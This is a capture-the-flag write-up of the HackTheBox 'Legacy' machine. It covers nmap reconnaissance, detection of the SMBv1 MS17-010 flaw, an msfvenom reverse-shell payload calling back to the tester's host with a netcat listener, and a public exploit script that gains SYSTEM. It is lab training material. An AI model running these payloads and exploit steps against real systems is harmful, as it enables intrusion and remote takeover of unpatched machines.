## Legacy HackTheBox
## Easy
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 10.10.10.4 -T4  -v -p-```

```
# Nmap 7.93 scan initiated Mon May 15 13:07:04 2023 as: nmap -A -T4 -v -p- -oN Legacy 10.10.10.4
Increasing send delay for 10.10.10.4 from 0 to 5 due to 1267 out of 3166 dropped probes since last increase.
Increasing send delay for 10.10.10.4 from 5 to 10 due to 11 out of 21 dropped probes since last increase.
Nmap scan report for 10.10.10.4
Host is up (0.21s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/15%OT=135%CT=1%CU=37050%PV=Y%DS=2%DC=T%G=Y%TM=646224
OS:37%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS
OS:=0)OPS(O1=M539NW0NNT00NNS%O2=M539NW0NNT00NNS%O3=M539NW0NNT00%O4=M539NW0N
OS:NT00NNS%O5=M539NW0NNT00NNS%O6=M539NNT00NNS)WIN(W1=FAF0%W2=FAF0%W3=FAF0%W
OS:4=FAF0%W5=FAF0%W6=FAF0)ECN(R=Y%DF=Y%T=80%W=FAF0%O=M539NW0NNS%CC=N%Q=)T1(
OS:R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=N%T=80%W=0%S=Z%A=S%F=AR%O=
OS:%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=FAF0%S=O%A=S+%F=AS%O=M539NW0NNT00NNS%RD=0%Q=
OS:)T4(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=80%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF
OS:=N%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=B0%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s
|_smb2-time: Protocol negotiation failed (SMB2)
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b97097 (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|_  LEGACY<20>           Flags: <unique><active>
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-05-20T17:20:48+03:00

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   221.90 ms 10.10.14.1
2   222.07 ms 10.10.10.4

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 15 13:23:19 2023 -- 1 IP address (1 host up) scanned in 974.89 seconds
```
From the scan above we have 3 ports opened. Port 135 which runs msrpc, port 139 which runs netbios-ssn and port 445 which runs microsoft-ds. Today We'll be starting our enumeration from port 139.




# Enumeration (Port 139)

Lets check this version of netbios for vulnerabilities using the nmap scripting engine

command:```nmap -p 139 --script smb-vuln*.nse 10.10.10.4```

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ nmap -p 139 --script smb-vuln*.nse 10.10.10.4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 13:19 WAT
Nmap scan report for 10.10.10.4
Host is up (0.22s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 7.87 seconds
```
From the scan we can tell that this version of netbios is vulnerable to ```CVE-2017-0143```

Lets look for available exploits

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8d570a87-c1bd-41cc-8347-6b4f5bde8575)

We'll be using that exploit, you can access it [here](https://github.com/c1ph3rm4st3r/MS17-010_CVE-2017-0143)

Lets clone this to our machine

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Legacy]                                                                                                                                              
└─$ git clone https://github.com/c1ph3rm4st3r/MS17-010_CVE-2017-0143.git                                                                                                                        
Cloning into 'MS17-010_CVE-2017-0143'...                                                                                                                                                        
remote: Enumerating objects: 33, done.                                                                                                                                                          
remote: Counting objects: 100% (33/33), done.                                                                                                                                                   
remote: Compressing objects: 100% (31/31), done.                                                                                                                                                
remote: Total 33 (delta 14), reused 0 (delta 0), pack-reused 0                                                                                                                                  
Receiving objects: 100% (33/33), 1.48 MiB | 1.09 MiB/s, done.                                                                                                                                   
Resolving deltas: 100% (14/14), done.                                                                                                                                                           
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Legacy]                                                                                                                                              
└─$ cd MS17-010_CVE-2017-0143                                                                                                                                                                   
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Legacy/MS17-010_CVE-2017-0143]                                                                                                                       
└─$ ls                                                                                                                                                                                          
checker.py  get-pip.py  mysmb.py  mysmb.pyc  README.md  send_and_execute.py 
```
cool, now lets create an executable using msfvenom

command:```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.31 LPORT=1234 -f exe -o ms17-010.exe ```

**_Note:Ensure you change the LHOST to that of your kali and also the LPORT to a port of your choice_**

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Legacy/MS17-010_CVE-2017-0143]                                                                                                                       
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.31 LPORT=1234 -f exe -o ms17-010.exe                                                                                                   
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                                                                                                          
[-] No arch selected, selecting arch: x86 from the payload                                                                                                                                      
No encoder specified, outputting raw payload                                                                                                                                                    
Payload size: 324 bytes                                                                                                                                                                         
Final size of exe file: 73802 bytes                                                                                                                                                             
Saved as: ms17-010.exe  
```
Now, lets try to run this

command:```python2.7 send_and_execute.py 10.10.10.4 ms17-010.exe```

Before you run the above command, ensure you set up your netcat listener ```nc -lvnp 1234```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/31d91952-a066-415c-bcd5-373f85e43ab8)

cool, now lets run the command

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Legacy/MS17-010_CVE-2017-0143]                                                                                                                       
└─$ python2.7 send_and_execute.py 10.10.10.4 ms17-010.exe                                                                                                                                       
Traceback (most recent call last):                                                                                                                                                              
  File "send_and_execute.py", line 2, in <module>                                                                                                                                               
    from impacket import smb, smbconnection                                                                                                                                                     
ImportError: No module named impacket
```
As you can see running the command gave a ```No module named impacket``` error😧. Don't worry we will solve this hehe😎

Lets try to install the ```impacket``` module

command:```sudo python2.7 get-pip.py```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Legacy]
└─$ cd MS17-010_CVE-2017-0143

┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Legacy/MS17-010_CVE-2017-0143]
└─$ sudo python2.7 get-pip.py
[sudo] password for bl4ck4non: 
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Collecting pip<21.0
  Using cached pip-20.3.4-py2.py3-none-any.whl (1.5 MB)
Installing collected packages: pip
  Attempting uninstall: pip
    Found existing installation: pip 20.3.4
    Uninstalling pip-20.3.4:
      Successfully uninstalled pip-20.3.4
Successfully installed pip-20.3.4
```
cool, run this after

command:```pip2.7 install --upgrade setuptools```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Legacy/MS17-010_CVE-2017-0143]
└─$ pip2.7 install --upgrade setuptools
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Defaulting to user installation because normal site-packages is not writeable
Collecting setuptools
  Downloading setuptools-44.1.1-py2.py3-none-any.whl (583 kB)
     |████████████████████████████████| 583 kB 369 kB/s 
Installing collected packages: setuptools
  WARNING: The scripts easy_install and easy_install-2.7 are installed in '/home/bl4ck4non/.local/bin' which is not on PATH.
  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.
Successfully installed setuptools-44.1.1
```
Lastly, installling ```impacket```

command:```python2.7 -m pip install impacket```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Legacy/MS17-010_CVE-2017-0143]
└─$ python2.7 -m pip install impacket  
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Defaulting to user installation because normal site-packages is not writeable
Collecting impacket
  Downloading impacket-0.10.0.tar.gz (1.4 MB)
     |████████████████████████████████| 1.4 MB 428 kB/s 
Collecting pyasn1>=0.2.3
  Downloading pyasn1-0.5.0-py2.py3-none-any.whl (83 kB)
     |████████████████████████████████| 83 kB 208 kB/s 
Collecting pycryptodomex
  Downloading pycryptodomex-3.17-cp27-cp27mu-manylinux2010_x86_64.whl (2.3 MB)
     |████████████████████████████████| 2.3 MB 567 kB/s 
Collecting pyOpenSSL>=0.16.2
  Downloading pyOpenSSL-21.0.0-py2.py3-none-any.whl (55 kB)
     |████████████████████████████████| 55 kB 273 kB/s 
Collecting six
  Using cached six-1.16.0-py2.py3-none-any.whl (11 kB)
Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5
  Downloading ldap3-2.9.1-py2.py3-none-any.whl (432 kB)
     |████████████████████████████████| 432 kB 2.3 MB/s 
Collecting ldapdomaindump>=0.9.0
  Downloading ldapdomaindump-0.9.4-py2-none-any.whl (18 kB)
Collecting flask>=1.0
  Downloading Flask-1.1.4-py2.py3-none-any.whl (94 kB)
     |████████████████████████████████| 94 kB 598 kB/s 
Collecting future
  Downloading future-0.18.3.tar.gz (840 kB)
     |████████████████████████████████| 840 kB 2.3 MB/s 
Collecting chardet
  Using cached chardet-4.0.0-py2.py3-none-any.whl (178 kB)
Collecting cryptography>=3.3
  Downloading cryptography-3.3.2-cp27-cp27mu-manylinux2010_x86_64.whl (2.6 MB)
     |████████████████████████████████| 2.6 MB 210 kB/s 
Collecting dnspython
  Downloading dnspython-1.16.0-py2.py3-none-any.whl (188 kB)
     |████████████████████████████████| 188 kB 250 kB/s 
Collecting itsdangerous<2.0,>=0.24
  Downloading itsdangerous-1.1.0-py2.py3-none-any.whl (16 kB)
Collecting click<8.0,>=5.1
  Downloading click-7.1.2-py2.py3-none-any.whl (82 kB)
     |████████████████████████████████| 82 kB 196 kB/s 
Collecting Jinja2<3.0,>=2.10.1
  Downloading Jinja2-2.11.3-py2.py3-none-any.whl (125 kB)
     |████████████████████████████████| 125 kB 2.7 MB/s 
Collecting Werkzeug<2.0,>=0.15
  Downloading Werkzeug-1.0.1-py2.py3-none-any.whl (298 kB)
     |████████████████████████████████| 298 kB 1.3 MB/s 
Requirement already satisfied: cffi>=1.12 in /usr/lib/python2.7/dist-packages (from cryptography>=3.3->pyOpenSSL>=0.16.2->impacket) (1.14.0)
Collecting enum34; python_version < "3"
  Downloading enum34-1.1.10-py2-none-any.whl (11 kB)
Collecting ipaddress; python_version < "3"
  Downloading ipaddress-1.0.23-py2.py3-none-any.whl (18 kB)
Collecting MarkupSafe>=0.23
  Downloading MarkupSafe-1.1.1-cp27-cp27mu-manylinux1_x86_64.whl (24 kB)
Building wheels for collected packages: impacket, future
  Building wheel for impacket (setup.py) ... done
  Created wheel for impacket: filename=impacket-0.10.0-py2-none-any.whl size=1452151 sha256=83473629403ad60fda1eaf0573bddf08d6147bc509854d0821d712a0150580b1
  Stored in directory: /home/bl4ck4non/.cache/pip/wheels/7c/34/57/25db2340a14ab4a8bc80bf44810d789b9e5215a7a737a77ba3
  Building wheel for future (setup.py) ... done
  Created wheel for future: filename=future-0.18.3-py2-none-any.whl size=503540 sha256=77b5babb8a913c24527561f5b5ff703741e196b15c4ae21e23dfaf915459a2fd
  Stored in directory: /home/bl4ck4non/.cache/pip/wheels/f4/cf/68/6299b44fe0ce2dcccb3e9de34443da085c6da93a204ef3130f
Successfully built impacket future
Installing collected packages: pyasn1, pycryptodomex, enum34, six, ipaddress, cryptography, pyOpenSSL, ldap3, future, dnspython, ldapdomaindump, itsdangerous, click, MarkupSafe, Jinja2, Werkzeug, flask, chardet, impacket
  WARNING: The scripts futurize and pasteurize are installed in '/home/bl4ck4non/.local/bin' which is not on PATH.
  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.                                                                             
  WARNING: The script flask is installed in '/home/bl4ck4non/.local/bin' which is not on PATH.
  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.                                                                             
  WARNING: The script chardetect is installed in '/home/bl4ck4non/.local/bin' which is not on PATH.
  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.                                                                             
Successfully installed Jinja2-2.11.3 MarkupSafe-1.1.1 Werkzeug-1.0.1 chardet-4.0.0 click-7.1.2 cryptography-3.3.2 dnspython-1.16.0 enum34-1.1.10 flask-1.1.4 future-0.18.3 impacket-0.10.0 ipaddress-1.0.23 itsdangerous-1.1.0 ldap3-2.9.1 ldapdomaindump-0.9.4 pyOpenSSL-21.0.0 pyasn1-0.5.0 pycryptodomex-3.17 six-1.16.0
```
Nice, now lets run that command again

command:```python2.7 send_and_execute.py 10.10.10.4 ms17-010.exe```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Legacy/MS17-010_CVE-2017-0143]
└─$ python2.7 send_and_execute.py 10.10.10.4 ms17-010.exe                            
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1                          
Using named pipe: spoolss
Groom packets                                   
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction                           
CONNECTION: 0x86017530                          
SESSION: 0xe113eb50                             
FLINK: 0x7bd48                                  
InData: 0x7ae28                                 
MID: 0xa                                        
TRANS1: 0x78b50                                 
TRANS2: 0x7ac90                                 
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe24163b8
userAndGroupCount: 0x3                          
userAndGroupsAddr: 0xe2416458
overwriting token UserAndGroups
Sending file D6JGFB.exe...
Opening SVCManager on 10.10.10.4.....
Creating service eLNq.....
Starting service eLNq.....
The NETBIOS connection with the remote host timed out.
Removing service eLNq.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error                               
Done         
```
Checking our netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9fc3ec72-f8cc-43cc-84ba-c87b64ccca7c)

Nice😎, we got a shell a shell as the highest privileged user. You can go ahead and grab the flags for both users.


That will be all for today
<br> <br>
[Back To Home](../../index.md)












